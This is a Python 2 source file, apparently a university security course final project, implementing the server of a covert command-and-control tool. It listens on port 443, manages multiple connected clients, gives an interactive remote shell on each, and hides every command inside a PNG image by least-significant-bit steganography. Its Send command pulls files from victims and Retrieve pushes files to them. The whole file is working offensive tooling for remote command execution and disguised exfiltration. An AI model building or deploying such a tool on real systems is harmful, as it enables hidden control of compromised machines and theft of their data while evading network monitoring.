import socket
import threading
import sys
import os
import time
from PIL import Image

connectionList = []
addressList = []
#fil = open("c&clog.txt", "w+")
#isConnect = True

# Python program implementing Image Steganography 

# PIL module is used to extract 
# pixels of image and modify it 
from PIL import Image 

# Convert encoding data into 8-bit binary 
# form using ASCII value of characters 
def genData(data): 
		
		# list of binary codes 
		# of given data 
		newd = [] 
		for i in data:
			newd.append(format(ord(i), '08b')) 
                #print newd
		return newd 
		
# Pixels are modified according to the 
# 8-bit binary data and finally returned 
def modPix(pix, data): 
	
	datalist = genData(data) 
	lendata = len(datalist) 
	imdata = iter(pix)
        #print "original"
	for i in range(lendata): 
		
		# Extracting 3 pixels at a time 
		#pix = [value for value in imdata.__next__()[:3] +
		#						imdata.__next__()[:3] +
		#						imdata.__next__()[:3]] 
		
                pix = []
                
                for ctn in range(0,3):
                    one_pix = next(imdata)
                    #print one_pix
                    for val in one_pix:
                        #print val
                        pix.append(val)

                #print len(pix)
		# Pixel value should be made 
		# odd for 1 and even for 0 
                k = 0
		for j in range(0, 8):
                        
                        #print k
                        #print j
    
			if (datalist[i][j]=='0') and (pix[k]% 2 != 0): 
				if (pix[k]% 2 != 0):
                                    if (pix[k] > 0):
					pix[k] -= 1
                                    else:
                                        pix[k] += 1
			elif (datalist[i][j] == '1') and (pix[k] % 2 == 0): 
                            if (pix[k] > 0):
				pix[k] -= 1
                            else:
                                pix[k] += 1
                        if (k > 0 and k % 4 == 2):
                            k += 2
                        else:
                            k += 1
				
		# Eigh^th pixel of every set tells 
		# whether to stop or read further. 
		# 0 means keep reading; 1 means the 
		# message is over. 
		if (i == lendata - 1): 
			if (pix[-2] % 2 == 0):
                            if (pix[-2] > 0):
				pix[-2] -= 1
                            else:
                                pix[-2] += 1
		else: 
			if (pix[-2] % 2 != 0):
                            if (pix[-2] > 0):
				pix[-2] -= 1
                            else:
                                pix[-2] += 1

		pix = tuple(pix)
                #print "new:"
                #print pix
		yield pix[0:4] 
		yield pix[4:8] 
		yield pix[8:12] 

def encode_enc(newimg, data): 
	w = newimg.size[0] 
	(x, y) = (0, 0)

        load = newimg.load()
	
	for pixel in modPix(newimg.getdata(), data): 
	        #print "pixel: "
                #print pixel
		# Putting modified pixels in the new image 
		load[x, y] = pixel
                
		if (x == w - 1): 
			x = 0
			y += 1
		else: 
			x += 1
        #print "new"
        
        #for ele in newimg.getdata():
            #print ele

        return newimg
        #print newimg.getpixel((0,0))
        #new = newimg.getdata()
        #for ele in new:
        #    print ele
			
# Encode data into image 
def encode(img, data): 
	#img = input("Enter image name(with extension): ") 
	image = Image.open(img, 'r') 
	
	#data = input("Enter data to be encoded : ") 
	if (len(data) == 0): 
		raise ValueError('Data is empty') 
		
	newimg = image.copy() 
	#encode_enc(newimg, data) 
	newImg = encode_enc(newimg, data)
    
	#new_img_name = input("Enter the name of new image(with extension): ")
        
	#newImg.save(new_img_name, str(new_img_name.split(".")[1].upper()))
        newImg.save("newCosmos.png")
        #newImg.close()
        #for ele in newImg.getdata():
        #    print ele
    

# Decode the data in the image 
def decode(img): 
	#img = input("Enter image name(with extension) :") 
	image = Image.open(img, 'r') 
	
	data = '' 
        
        img_dt = image.getdata()
	imgdata = iter(img_dt) 

        #for ele in img_dt:
        #    print ele
    
        notEnd = True
	while (notEnd): 
		#pixels = [value for value in imgdata.__next__()[:3] +
		#						imgdata.__next__()[:3] +
		#						imgdata.__next__()[:3]] 
		# string of binary data 
                pixels = []
                for cnt in range(0,3):
                    one_pixel = next(imgdata)
                    #print one_pixel
                    for val in one_pixel:
                        #print val
                        pixels.append(val)

		binstr = '' 
		
		for i in range(0,10): 
                    if (i % 4 != 3):
                        #print i
			if (pixels[i] % 2 == 0): 
				binstr += '0'
			else: 
				binstr += '1'
		
                #print binstr
		data += chr(int(binstr, 2)) 
		if (pixels[-2] % 2 != 0):
                    notEnd = False
        #print data
	return data 

def endconnection2():
    content = encode("cosmos.png", "close")
    sendToClient("newCosmos.png", selected)
    
    #print "selected is "
    #print selected
    connectionList[selected].close()
    connectionList.pop(selected)
    addressList.pop(selected)
#def updateRecv():
    
    #try:
        #fil = open("c&clog.txt", "a+")
        #for i in range(len(connectionList)):
            #content = connectionList[i].recv(1024)
            #address = addressList[i]
            #msg = str(address) + " still connecting " + content + "\n"
        
            #fil.write(msg)
        #fil.close()
        #threading.Timer(1, updateRecv).start()
    #except:
        #print "???"

def getconnection():
    for c in connectionList:
        c.close()
    del connectionList[:]
    del addressList[:]
    while 1:
        try:
            client,addr = server.accept()
            client.setblocking(1)
            connectionList.append(client)
            addressList.append(addr)
        except:
            break

def endconnection():
    connectionList[selected].send("close")
    connectionList[selected].close()
    connectionList.pop(selected)
    addressList.pop(selected)

def sendToClient(fileName, selected):
    fileSize = str(os.path.getsize(fileName))
    #print "file size is " + fileSize
    connectionList[selected].send(fileSize)
    #print "after send file size"
    res = connectionList[selected].recv(1024)
    #print "after receive res"
    if (res == "OK"):
        #print "sending 1"
        with open(fileName, 'rb') as f:
            #connectionList[selected].sendall()
            bytestosend = f.read(1024)
            #print bytestosend
            connectionList[selected].send(bytestosend)
            #print "sending 2"
            while bytestosend != "":
                #print "sending"
                bytestosend = f.read(1024)
                connectionList[selected].send(bytestosend)
def sendToClients(fileName):
    for c in connectionList:
        fileSize = str(os.path.getsize(fileName))
        #print "file size is " + fileSize
        c.send(fileSize)
    with open(fileName, 'rb') as f:
        bytestosend = f.read(1024)
        for selected in connectionList:
            selected.send(bytestosend)
            while bytestosend != "":
                bytestosend = f.read(1024)
                selected.send(bytestosend)
            

time.sleep(0.5)
print """
            Stony Brook University
            CSE 363 2019 Final Project
            Covert C&C and Exfiltration
            Haoyu Tan, Hsin Ying Lin

"""

time.sleep(0.5)
ip = raw_input("---> set host: ")
#port = int(raw_input("---> set port: "))
port = 443

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.settimeout(5)
server.bind((ip, port))
server.listen(10)
time.sleep(1)

print """
    Type in commands listed in the following menu:
        - Connect
        - List
        - shell <id>
            - Exit
            - Close
            - Back
            - Retrieve <filename>
            - Send <filename>
        - Quit (end all connections)
        - Exit
"""
#fil = open("c&clog.txt", "a+")
#updateRecv()
while 1:
    #updateRecv()
    inp = raw_input("\n ---> ")

    if (inp == "Connect" or inp == "connect"):
        print "Connecting...."
        getconnection()
        
        
        
        print "Done, use 'List' command to check all connected clients"
    elif (inp == "List" or inp == "list"):
        print "========Current Connected Clients========"
        for c in addressList:
            print "%d - %s:%s" % (addressList.index(c) + 1, str(c[0]), str(c[1]))
        print "\n"
    elif (inp == "Quit" or inp == "quit"):
        #isConnect = False
        content = encode("cosmos.png", "quit")
        if len(connectionList) == 0:
            print "No connection to stop."
        else:
            for c in range(len(connectionList)):
                sendToClient("newCosmos.png", c)
            #c.send(content)
            for i in range(len(addressList)):
                addressList.pop(0)
            for c in connectionList:
                c.close()
                del c
    elif (inp == "Exit" or inp == "exit"):
        #isConnect = False
        if len(connectionList) == 0:
            print ""
        else:
            print "Ending all connections..."
            content = encode("cosmos.png", "exit")
            if len(connectionList == 0):
                print ""
            else:
                for c in range(len(connectionList)):
                    sendToClient("newCosmos.png", c)
            #c.close()
                for i in range(len(addressList)):
                    addressList.pop(0)
                for c in connectionList:
                    c.close()
                    del c
        time.sleep(0.3)
        print "Ending program..."
        time.sleep(0.5)
        print "Goodbye!"
        os._exit(1)
    elif ("shell" in inp):
        inputnum = int(inp.replace("shell ", ""))
        selected = inputnum -1
        if ((selected < len(addressList)) and (selected >= 0)):
            print """
            This is client <%d> shell
                Special commands:
                - close (close the current connection and go back)
                - back (go back to main without closing current connection)
                - Retrieve <filename>
                - Send <filename>
                - Exit (end all connection and the program)
            """ % inputnum
            while True:
                try:
                    command = raw_input("\nClientShell> ")
                    if command == "exit":
                        print "Ending all connections..."
                        content = encode("cosmos.png", "quit")
                        #decode("newCosmos.png")
                        for c in range(len(connectionList)):
                            sendToClient("newCosmos.png", c)
                        
                        for i in range(len(connectionList)):
                            addressList.pop(0)
                        for c in connectionList:
                            c.close()
                            del c
                        time.sleep(0.3)
                        print "Ending program..."
                        time.sleep(0.5)
                        print "Goodbye!"
                        os._exit(1)
                    elif command == "close":
                        print "Ending current connection and going back to main page..."
                        endconnection2()
                        break;
                    elif ("cd " in command):
                        content = encode("cosmos.png", command)
                        sendToClient("newCosmos.png", selected)
                        #connectionList[selected].send(command)
                        response = connectionList[selected].recv(4096)
                        path = response + ">"
                        print "Direction updated: %s" %path
                    elif ("Retrieve" in command):
                        filename = command.replace ("Retrieve ","")
                        if os.path.isfile(filename):
                            #connectionList[selected].send(command + " " + str(os.path.getsize(filename)))
                            finalcommand = command + " " + str(os.path.getsize(filename))
                            print "this is the final command %s" % finalcommand
                            content = encode("cosmos.png", finalcommand)
                            sendToClient("newCosmos.png", selected)
                            clientResponse = connectionList[selected].recv(1024)
                            if clientResponse == "OK":
                                with open(filename, 'rb') as f:
                                    bytestosend = f.read(1024)
                                    connectionList[selected].send(bytestosend)
                                    while bytestosend != "":
                                        bytestosend = f.read(1024)
                                        connectionList[selected].send(bytestosend)
                        else:
                            print "Input file doesn't exists."
                    elif ("Send" in command):
                        filename = command.replace("Send ","")
                        #connectionList[selected].send(command)
                        content = encode("cosmos.png", command)
                        sendToClient("newCosmos.png", selected)
                        csResponse = connectionList[selected].recv(1024)
                        print "client response: %s " % csResponse
                        csrsplit = csResponse.split()
                        if csrsplit[0] == 'EXISTS':
                            print "in EXISTS if, filesize to be get"
                            filesize = long(csrsplit[1])
                            print "filesize is %d" % filesize
                            connectionList[selected].send("OK")
                            print "send OK to cs"
                            f = open('new_'+filename, 'wb')
                            data = connectionList[selected].recv(1024)
                            totalRecv = len(data)
                            f.write(data)
                            while totalRecv < filesize:
                                data = connectionList[selected].recv(1024)
                                totalRecv += len(data)
                                f.write(data)
                            print "Download Complete!"
                            f.close()
                        else:
                            print "Input file does not exists."



                    elif command == "back":
                        break;
                    else:
                        content = encode("cosmos.png", command)
                        sendToClient("newCosmos.png", selected)
                        #connectionList[selected].send(command)
                        try:
                            response = connectionList[selected].recv(4096)
                            while response != "":
                            #while "#" not in response:
                                print response
                                #print "counting!"
                                response = connectionList[selected].recv(4096)
                        except KeyboardInterrupt:
                            pass
                except Exception, e:
                    pass

